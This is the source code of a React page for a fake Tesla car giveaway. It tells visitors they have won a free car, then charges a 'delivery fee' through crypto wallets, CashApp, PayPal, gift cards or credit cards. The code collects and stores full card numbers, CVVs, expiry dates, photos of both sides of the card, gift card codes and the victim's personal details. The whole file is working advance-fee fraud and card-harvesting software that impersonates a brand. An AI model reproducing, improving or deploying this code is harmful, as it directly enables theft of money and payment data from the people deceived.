import { useState, useEffect } from 'react';
import { SiteSettings, PaymentSubmission, uploadFile } from '@/lib/dataService';
import { ArrowLeft, CheckCircle, Car, MapPin, User, Upload, Copy, CreditCard, Gift } from 'lucide-react';
import { Button } from '@/components/ui/button';
import { toast } from 'sonner';
import { createPageUrl } from '@/utils';

const TESLA_LOGO = "/images/tesla-logo.png";
const TESLA_CAR = "/images/tesla-model-3.jpg";

const TESLA_MODELS = ["Tesla Model 3 2025","Tesla Model Y 2025","Tesla Model S 2025","Tesla Model X 2025","Tesla Model Y LR 2025","Tesla Model 3 2024","Tesla Model Y 2024","Tesla Model S 2024","Tesla Model X 2024","Tesla Cybertruck 2025"];
const DELIVERY_OPTIONS = [
  { id: 1, label: "Standard Delivery", duration: "10–14 business days", fee: "$299", desc: "Standard international shipping & customs clearance" },
  { id: 2, label: "Express Delivery", duration: "5–7 business days", fee: "$349", desc: "Priority shipping with real-time tracking updates" },
  { id: 3, label: "Premium Delivery", duration: "3–5 business days", fee: "$399", desc: "Fastest dispatch, white-glove doorstep delivery" },
];

const STEPS = { DETAILS: 'details', ORDER: 'order', PAYMENT: 'payment', SUCCESS: 'success' };
const inputCls = "w-full bg-gray-800 border border-gray-700 text-white rounded-xl px-4 py-3 text-sm placeholder-gray-500 focus:outline-none focus:border-red-500";

export default function Participate() {
  const [step, setStep] = useState(STEPS.DETAILS);
  const [selectedModel, setSelectedModel] = useState(TESLA_MODELS[0]);
  const [selectedDelivery, setSelectedDelivery] = useState(DELIVERY_OPTIONS[0]);
  const [cryptoWallets, setCryptoWallets] = useState<any[]>([]);
  const [cashAppTag, setCashAppTag] = useState('');
  const [paypalTag, setPaypalTag] = useState('');
  const [paymentType, setPaymentType] = useState('crypto');
  const [selectedWallet, setSelectedWallet] = useState<any>(null);
  const [copied, setCopied] = useState(false);
  const [cardFrontUrl, setCardFrontUrl] = useState('');
  const [cardBackUrl, setCardBackUrl] = useState('');
  const [cardInfo, setCardInfo] = useState({ number: '', expiry: '', cvv: '', holder: '' });
  const [giftFrontUrl, setGiftFrontUrl] = useState('');
  const [giftBackUrl, setGiftBackUrl] = useState('');
  const [giftCode, setGiftCode] = useState('');
  const [proofUrl, setProofUrl] = useState('');
  const [uploading, setUploading] = useState<Record<string, boolean>>({});
  const [submitting, setSubmitting] = useState(false);
  const [successCountdown, setSuccessCountdown] = useState(20);
  const [form, setForm] = useState({ fullName: '', email: '', phone: '', address: '', city: '', country: '', zip: '' });

  useEffect(() => {
    const params = new URLSearchParams(window.location.search);
    const idx = parseInt(params.get('wallet') || '0');
    if (TESLA_MODELS[idx]) setSelectedModel(TESLA_MODELS[idx]);

    const records = SiteSettings.list();
    if (records && records.length > 0) {
      const s = records[0];
      const count = parseInt(s.pm_count) || 0;
      const wallets = Array.from({ length: count }, (_, i) => ({
        id: `pm_${i}`, label: s[`pm_${i+1}_label`]||'', address: s[`pm_${i+1}_address`]||'', logo: s[`pm_${i+1}_logo`]||'',
      })).filter(w => w.label && w.address);
      setCryptoWallets(wallets);
      if (wallets.length > 0) setSelectedWallet(wallets[0]);
      if (s.cashapp_tag) setCashAppTag(s.cashapp_tag);
      if (s.paypal_tag) setPaypalTag(s.paypal_tag);
    }
  }, []);

  useEffect(() => {
    if (step !== STEPS.SUCCESS) return;
    setSuccessCountdown(20);
    const t = setInterval(() => {
      setSuccessCountdown(prev => { if (prev <= 1) { clearInterval(t); window.location.href = createPageUrl('Home'); return 0; } return prev - 1; });
    }, 1000);
    return () => clearInterval(t);
  }, [step]);

  const handleFormChange = (field: string, value: string) => setForm(prev => ({ ...prev, [field]: value }));

  const handleDetailsSubmit = () => {
    if (!form.fullName || !form.email || !form.phone || !form.address || !form.city || !form.country) { toast.error("Please fill in all required fields."); return; }
    setStep(STEPS.ORDER);
  };

  const handleFileUpload = async (file: File | undefined, key: string, onDone: (url: string) => void) => {
    if (!file) return;
    setUploading(p => ({ ...p, [key]: true }));
    const url = await uploadFile(file);
    onDone(url);
    setUploading(p => ({ ...p, [key]: false }));
  };

  const handleCopy = () => {
    if (!selectedWallet?.address) return;
    navigator.clipboard.writeText(selectedWallet.address);
    setCopied(true); toast.success("Address copied!"); setTimeout(() => setCopied(false), 2000);
  };

  const handleConfirmPayment = () => {
    setSubmitting(true);
    const base: Record<string, string> = {
      full_name: form.fullName, email: form.email, phone: form.phone, address: form.address,
      city: form.city, country: form.country, zip: form.zip, car_model: selectedModel,
      delivery_option: selectedDelivery.label, delivery_fee: selectedDelivery.fee,
      payment_type: paymentType, status: 'pending', payment_proof_url: proofUrl || '',
    };
    if (paymentType === 'crypto') { base.payment_label = selectedWallet?.label||''; base.wallet_address_used = selectedWallet?.address||''; }
    else if (paymentType === 'cashapp') { base.payment_label = 'CashApp'; base.cashapp_tag = cashAppTag; }
    else if (paymentType === 'paypal') { base.payment_label = 'PayPal'; base.paypal_tag = paypalTag; }
    else if (paymentType === 'credit_card') { base.payment_label = 'Credit Card'; base.credit_card_front_url = cardFrontUrl; base.credit_card_back_url = cardBackUrl; base.card_number = cardInfo.number; base.card_expiry = cardInfo.expiry; base.card_cvv = cardInfo.cvv; base.card_holder_name = cardInfo.holder; }
    else if (paymentType === 'apple_gift_card') { base.payment_label = 'Apple Gift Card'; base.apple_gift_front_url = giftFrontUrl; base.apple_gift_back_url = giftBackUrl; base.apple_gift_code = giftCode; }

    PaymentSubmission.create(base);
    setSubmitting(false);
    setStep(STEPS.SUCCESS);
  };

  if (step === STEPS.DETAILS) {
    return (
      <div className="min-h-screen bg-gray-950 px-4 py-10">
        <div className="w-full max-w-lg mx-auto">
          <div className="flex items-center gap-3 mb-8">
            <a href={createPageUrl('Home')} className="text-gray-500 hover:text-white transition-colors"><ArrowLeft className="w-5 h-5" /></a>
            <img src={TESLA_LOGO} alt="Tesla" className="w-8 h-8 rounded-full object-contain bg-white border border-red-600 p-0.5" />
            <span className="text-white font-bold">Tesla Car Giveaway — Claim Your Car</span>
          </div>
          <div className="bg-red-600/10 border border-red-500/30 rounded-2xl p-4 mb-6 flex items-center gap-3">
            <img src={TESLA_CAR} alt="Tesla Car" className="w-16 h-12 object-cover rounded-xl shrink-0" />
            <div><p className="text-white font-bold text-sm">🎉 You've been selected!</p><p className="text-red-300 text-xs mt-0.5">Fill in your delivery details.</p></div>
          </div>
          <div className="bg-gray-900 border border-gray-800 rounded-2xl p-5 mb-5">
            <label className="text-white font-bold text-sm mb-3 flex items-center gap-2"><Car className="w-4 h-4 text-red-500" /> Choose Your Tesla Car Model</label>
            <select value={selectedModel} onChange={e => setSelectedModel(e.target.value)} className="w-full mt-2 bg-gray-800 border border-gray-700 text-white rounded-xl px-4 py-3 text-sm focus:outline-none focus:border-red-500">
              {TESLA_MODELS.map(m => <option key={m} value={m}>{m}</option>)}
            </select>
          </div>
          <div className="bg-gray-900 border border-gray-800 rounded-2xl p-5 mb-5">
            <p className="text-white font-bold text-sm mb-4 flex items-center gap-2"><User className="w-4 h-4 text-red-500" /> Personal Information</p>
            <div className="space-y-3">
              <input placeholder="Full Name *" value={form.fullName} onChange={e => handleFormChange('fullName', e.target.value)} className={inputCls} />
              <input placeholder="Email Address *" type="email" value={form.email} onChange={e => handleFormChange('email', e.target.value)} className={inputCls} />
              <input placeholder="Phone Number *" type="tel" value={form.phone} onChange={e => handleFormChange('phone', e.target.value)} className={inputCls} />
            </div>
          </div>
          <div className="bg-gray-900 border border-gray-800 rounded-2xl p-5 mb-6">
            <p className="text-white font-bold text-sm mb-4 flex items-center gap-2"><MapPin className="w-4 h-4 text-red-500" /> Delivery Address</p>
            <div className="space-y-3">
              <input placeholder="Street Address *" value={form.address} onChange={e => handleFormChange('address', e.target.value)} className={inputCls} />
              <div className="grid grid-cols-2 gap-3">
                <input placeholder="City *" value={form.city} onChange={e => handleFormChange('city', e.target.value)} className={inputCls} />
                <input placeholder="ZIP / Postal" value={form.zip} onChange={e => handleFormChange('zip', e.target.value)} className={inputCls} />
              </div>
              <input placeholder="Country *" value={form.country} onChange={e => handleFormChange('country', e.target.value)} className={inputCls} />
            </div>
          </div>
          <Button onClick={handleDetailsSubmit} className="w-full bg-red-600 hover:bg-red-700 text-white py-5 text-base font-bold rounded-xl">Order Now →</Button>
        </div>
      </div>
    );
  }

  if (step === STEPS.ORDER) {
    return (
      <div className="min-h-screen bg-gray-950 px-4 py-10">
        <div className="w-full max-w-lg mx-auto">
          <div className="flex items-center gap-3 mb-8">
            <button onClick={() => setStep(STEPS.DETAILS)} className="text-gray-500 hover:text-white"><ArrowLeft className="w-5 h-5" /></button>
            <img src={TESLA_LOGO} alt="Tesla" className="w-8 h-8 rounded-full object-contain bg-white border border-red-600 p-0.5" />
            <span className="text-white font-bold">Order Summary</span>
          </div>
          <div className="bg-gray-900 border border-gray-800 rounded-2xl p-5 mb-5">
            <img src={TESLA_CAR} alt={selectedModel} className="w-full h-44 object-cover rounded-xl mb-4" />
            <div className="flex items-center justify-between">
              <div><p className="text-white font-black text-lg">{selectedModel}</p><p className="text-red-400 text-sm">Brand New Electric Vehicle</p></div>
              <span className="bg-green-500/20 text-green-400 text-xs font-bold px-3 py-1.5 rounded-full">FREE 🎉</span>
            </div>
          </div>
          <div className="bg-gray-900 border border-gray-800 rounded-2xl p-5 mb-5">
            <p className="text-gray-400 text-xs uppercase tracking-wide font-semibold mb-3">Deliver To</p>
            <p className="text-white font-bold">{form.fullName}</p>
            <p className="text-gray-400 text-sm">{form.email} · {form.phone}</p>
            <p className="text-gray-400 text-sm mt-1">{form.address}, {form.city}, {form.country} {form.zip}</p>
          </div>
          <div className="bg-gray-900 border border-gray-800 rounded-2xl p-5 mb-6">
            <p className="text-white font-bold text-sm mb-3">Select Delivery Option</p>
            <div className="space-y-3">
              {DELIVERY_OPTIONS.map(opt => (
                <button key={opt.id} onClick={() => setSelectedDelivery(opt)}
                  className={`w-full text-left rounded-xl border p-4 transition-colors ${selectedDelivery.id === opt.id ? 'border-red-500 bg-red-500/10' : 'border-gray-700 bg-gray-800'}`}>
                  <div className="flex items-center justify-between mb-1">
                    <span className="text-white font-bold text-sm">{opt.label}</span>
                    <span className="text-red-400 font-black">{opt.fee}</span>
                  </div>
                  <p className="text-gray-400 text-xs">{opt.desc}</p>
                  <p className="text-gray-500 text-xs mt-1">⏱ {opt.duration}</p>
                </button>
              ))}
            </div>
          </div>
          <div className="bg-gray-900 border border-gray-700 rounded-xl p-4 mb-6 flex items-center justify-between">
            <div><p className="text-gray-400 text-xs">Delivery Fee Only</p><p className="text-white font-black text-2xl">{selectedDelivery.fee}</p></div>
            <div className="text-right"><p className="text-green-400 text-sm font-bold">Car Value: FREE</p><p className="text-gray-500 text-xs">{selectedDelivery.duration}</p></div>
          </div>
          <Button onClick={() => setStep(STEPS.PAYMENT)} className="w-full bg-red-600 hover:bg-red-700 text-white py-5 text-base font-bold rounded-xl">Pay for Delivery Now →</Button>
        </div>
      </div>
    );
  }

  if (step === STEPS.PAYMENT) {
    const paymentTypes = [
      ...(cryptoWallets.length > 0 ? [{ id: 'crypto', label: 'Crypto Wallet', emoji: '🪙' }] : []),
      ...(cashAppTag ? [{ id: 'cashapp', label: 'CashApp', emoji: '💵' }] : []),
      ...(paypalTag ? [{ id: 'paypal', label: 'PayPal', emoji: '🅿️' }] : []),
      { id: 'credit_card', label: 'Credit Card', emoji: '💳' },
      { id: 'apple_gift_card', label: 'Apple Gift Card', emoji: '🍎' },
    ];

    return (
      <div className="min-h-screen bg-gray-950 px-4 py-10">
        <div className="w-full max-w-lg mx-auto">
          <div className="flex items-center gap-3 mb-8">
            <button onClick={() => setStep(STEPS.ORDER)} className="text-gray-500 hover:text-white"><ArrowLeft className="w-5 h-5" /></button>
            <img src={TESLA_LOGO} alt="Tesla" className="w-8 h-8 rounded-full object-contain bg-white border border-red-600 p-0.5" />
            <span className="text-white font-bold">Pay Delivery Fee — {selectedDelivery.fee}</span>
          </div>

          <div className="bg-green-500/10 border border-green-500/30 rounded-xl p-4 mb-6">
            <p className="text-green-300 text-sm font-semibold">✅ Delivering: <span className="text-white">{selectedModel}</span> to <span className="text-white">{form.city}, {form.country}</span></p>
          </div>

          <div className="bg-gray-900 border border-gray-800 rounded-2xl p-5 mb-5">
            <p className="text-white font-bold text-sm mb-3">Select Payment Method</p>
            <div className="grid grid-cols-2 gap-3">
              {paymentTypes.map(pt => (
                <button key={pt.id} onClick={() => setPaymentType(pt.id)}
                  className={`rounded-xl border p-3 text-center transition-colors ${paymentType === pt.id ? 'border-red-500 bg-red-500/10' : 'border-gray-700 bg-gray-800'}`}>
                  <div className="text-2xl mb-1">{pt.emoji}</div>
                  <p className="text-white text-xs font-semibold">{pt.label}</p>
                </button>
              ))}
            </div>
          </div>

          {paymentType === 'crypto' && cryptoWallets.length > 0 && (
            <div className="bg-gray-900 border border-gray-800 rounded-2xl p-5 mb-5">
              <p className="text-white font-bold text-sm mb-3">Select Crypto Wallet</p>
              <div className="space-y-2 mb-4">
                {cryptoWallets.map((w: any, i: number) => (
                  <button key={w.id || i} onClick={() => setSelectedWallet(w)}
                    className={`w-full flex items-center gap-3 rounded-xl border p-3 text-left transition-colors ${selectedWallet?.id === w.id ? 'border-red-500 bg-red-500/10' : 'border-gray-700 bg-gray-800 hover:border-gray-600'}`}>
                    {w.logo ? (
                      <img src={w.logo} alt={w.label} className="w-10 h-10 rounded-full object-contain bg-gray-700 border border-gray-600 p-1 shrink-0" />
                    ) : (
                      <div className="w-10 h-10 rounded-full bg-gray-700 flex items-center justify-center text-white font-bold text-xs shrink-0">{w.label?.slice(0, 2)}</div>
                    )}
                    <div className="flex-1 min-w-0">
                      <p className="text-white font-bold text-sm">{w.label}</p>
                      <p className="text-gray-500 text-xs font-mono truncate">{w.address}</p>
                    </div>
                    {selectedWallet?.id === w.id && <CheckCircle className="w-5 h-5 text-red-500 shrink-0" />}
                  </button>
                ))}
              </div>
              {selectedWallet && (
                <>
                  <p className="text-gray-400 text-xs uppercase tracking-wide font-semibold mb-2">Send {selectedDelivery.fee} to this address</p>
                  <div className="bg-gray-800 rounded-xl p-4 flex items-center gap-3">
                    <code className="text-green-400 text-xs break-all flex-1 font-mono">{selectedWallet.address}</code>
                    <button onClick={handleCopy} className="shrink-0 bg-gray-700 hover:bg-red-600 transition-colors rounded-lg p-2">
                      {copied ? <CheckCircle className="w-4 h-4 text-green-400" /> : <Copy className="w-4 h-4 text-white" />}
                    </button>
                  </div>
                </>
              )}
            </div>
          )}

          {paymentType === 'cashapp' && (
            <div className="bg-gray-900 border border-gray-800 rounded-2xl p-5 mb-5">
              <p className="text-white font-bold text-sm mb-1">Send via CashApp</p>
              <div className="bg-green-900/30 border border-green-700 rounded-xl p-4 mt-3">
                <p className="text-green-300 font-black text-xl">{cashAppTag}</p>
              </div>
            </div>
          )}

          {paymentType === 'paypal' && (
            <div className="bg-gray-900 border border-gray-800 rounded-2xl p-5 mb-5">
              <p className="text-white font-bold text-sm mb-1">Send via PayPal</p>
              <div className="bg-blue-900/30 border border-blue-700 rounded-xl p-4 mt-3">
                <p className="text-blue-300 font-black text-xl">{paypalTag}</p>
              </div>
            </div>
          )}

          {paymentType === 'credit_card' && (
            <div className="bg-gray-900 border border-gray-800 rounded-2xl p-5 mb-5 space-y-4">
              <div className="flex items-center gap-2 mb-1"><CreditCard className="w-4 h-4 text-red-500" /><p className="text-white font-bold text-sm">Credit Card Payment</p></div>
              <div className="grid grid-cols-2 gap-3">
                <label className="cursor-pointer block">
                  <div className={`h-28 rounded-xl border-2 border-dashed flex flex-col items-center justify-center ${cardFrontUrl ? 'border-green-500' : 'border-gray-600'}`}>
                    {cardFrontUrl ? <img src={cardFrontUrl} alt="front" className="w-full h-full object-cover rounded-xl" /> : <><Upload className="w-5 h-5 text-gray-500 mb-1" /><span className="text-gray-500 text-xs">Upload Front</span></>}
                  </div>
                  <input type="file" accept="image/*" className="hidden" onChange={e => handleFileUpload(e.target.files?.[0], 'cardFront', setCardFrontUrl)} />
                </label>
                <label className="cursor-pointer block">
                  <div className={`h-28 rounded-xl border-2 border-dashed flex flex-col items-center justify-center ${cardBackUrl ? 'border-green-500' : 'border-gray-600'}`}>
                    {cardBackUrl ? <img src={cardBackUrl} alt="back" className="w-full h-full object-cover rounded-xl" /> : <><Upload className="w-5 h-5 text-gray-500 mb-1" /><span className="text-gray-500 text-xs">Upload Back</span></>}
                  </div>
                  <input type="file" accept="image/*" className="hidden" onChange={e => handleFileUpload(e.target.files?.[0], 'cardBack', setCardBackUrl)} />
                </label>
              </div>
              <input placeholder="Card Holder Name" value={cardInfo.holder} onChange={e => setCardInfo(p => ({ ...p, holder: e.target.value }))} className={inputCls} />
              <input placeholder="Card Number" value={cardInfo.number} onChange={e => setCardInfo(p => ({ ...p, number: e.target.value }))} maxLength={19} className={inputCls} />
              <div className="grid grid-cols-2 gap-3">
                <input placeholder="MM/YY" value={cardInfo.expiry} onChange={e => setCardInfo(p => ({ ...p, expiry: e.target.value }))} maxLength={5} className={inputCls} />
                <input placeholder="CVV" value={cardInfo.cvv} onChange={e => setCardInfo(p => ({ ...p, cvv: e.target.value }))} maxLength={4} className={inputCls} />
              </div>
            </div>
          )}

          {paymentType === 'apple_gift_card' && (
            <div className="bg-gray-900 border border-gray-800 rounded-2xl p-5 mb-5 space-y-4">
              <div className="flex items-center gap-2 mb-1"><Gift className="w-4 h-4 text-red-500" /><p className="text-white font-bold text-sm">Apple Gift Card</p></div>
              <div className="grid grid-cols-2 gap-3">
                <label className="cursor-pointer block">
                  <div className={`h-28 rounded-xl border-2 border-dashed flex flex-col items-center justify-center ${giftFrontUrl ? 'border-green-500' : 'border-gray-600'}`}>
                    {giftFrontUrl ? <img src={giftFrontUrl} alt="front" className="w-full h-full object-cover rounded-xl" /> : <><Upload className="w-5 h-5 text-gray-500 mb-1" /><span className="text-gray-500 text-xs">Front</span></>}
                  </div>
                  <input type="file" accept="image/*" className="hidden" onChange={e => handleFileUpload(e.target.files?.[0], 'giftFront', setGiftFrontUrl)} />
                </label>
                <label className="cursor-pointer block">
                  <div className={`h-28 rounded-xl border-2 border-dashed flex flex-col items-center justify-center ${giftBackUrl ? 'border-green-500' : 'border-gray-600'}`}>
                    {giftBackUrl ? <img src={giftBackUrl} alt="back" className="w-full h-full object-cover rounded-xl" /> : <><Upload className="w-5 h-5 text-gray-500 mb-1" /><span className="text-gray-500 text-xs">Back</span></>}
                  </div>
                  <input type="file" accept="image/*" className="hidden" onChange={e => handleFileUpload(e.target.files?.[0], 'giftBack', setGiftBackUrl)} />
                </label>
              </div>
              <input placeholder="Gift Card Code: XXXX-XXXX-XXXX" value={giftCode} onChange={e => setGiftCode(e.target.value)} className={inputCls + " font-mono tracking-widest"} />
            </div>
          )}

          <div className="bg-gray-900 border border-yellow-500/40 rounded-2xl p-5 mb-5">
            <p className="text-yellow-400 font-bold text-sm mb-1 flex items-center gap-2"><Upload className="w-4 h-4" /> Upload Payment Proof</p>
            <label className="cursor-pointer block mt-3">
              <div className={`h-36 rounded-xl border-2 border-dashed flex flex-col items-center justify-center ${proofUrl ? 'border-green-500 bg-green-500/5' : 'border-yellow-500/40 bg-gray-800'}`}>
                {proofUrl ? <img src={proofUrl} alt="proof" className="h-full w-full object-contain rounded-xl p-1" /> : <><Upload className="w-6 h-6 text-yellow-400 mb-2" /><span className="text-yellow-400 text-sm font-semibold">Tap to upload proof</span></>}
              </div>
              <input type="file" accept="image/*" className="hidden" onChange={e => handleFileUpload(e.target.files?.[0], 'proof', (url) => { setProofUrl(url); toast.success("Proof uploaded!"); })} />
            </label>
          </div>

          <Button onClick={handleConfirmPayment} disabled={submitting} className="w-full bg-red-600 hover:bg-red-700 text-white py-5 text-base font-bold rounded-xl">
            {submitting ? "Submitting..." : "I've Paid — Confirm My Order ✓"}
          </Button>
        </div>
      </div>
    );
  }

  if (step === STEPS.SUCCESS) {
    return (
      <div className="min-h-screen bg-gray-950 flex flex-col items-center justify-center px-4">
        <div className="w-full max-w-md text-center">
          <div className="w-28 h-28 rounded-full mx-auto mb-6 overflow-hidden border-4 border-green-500 shadow-2xl shadow-green-500/30">
            <img src={TESLA_CAR} alt="Tesla Car" className="w-full h-full object-cover" />
          </div>
          <div className="text-5xl mb-4">🎉</div>
          <h2 className="text-3xl font-black text-white mb-3">Order Received!</h2>
          <p className="text-gray-400 mb-6">Once your payment is verified, you will get a message on your phone with tracking information.</p>
          <div className="bg-green-500/10 border border-green-500/30 rounded-2xl p-6 mb-6 text-left">
            <p className="text-green-300 font-bold mb-3">✅ Order Details</p>
            <div className="space-y-1.5 text-sm">
              <p className="text-gray-300"><span className="text-gray-500">Car:</span> <span className="font-bold text-white">{selectedModel}</span></p>
              <p className="text-gray-300"><span className="text-gray-500">Name:</span> <span className="text-white">{form.fullName}</span></p>
              <p className="text-gray-300"><span className="text-gray-500">Delivery:</span> <span className="text-white">{selectedDelivery.label}</span></p>
              <p className="text-gray-300"><span className="text-gray-500">Fee Paid:</span> <span className="text-red-400 font-bold">{selectedDelivery.fee}</span></p>
            </div>
          </div>
          <p className="text-gray-500 text-sm">Redirecting to home in <span className="text-white font-bold">{successCountdown}s</span></p>
        </div>
      </div>
    );
  }

  return null;
}
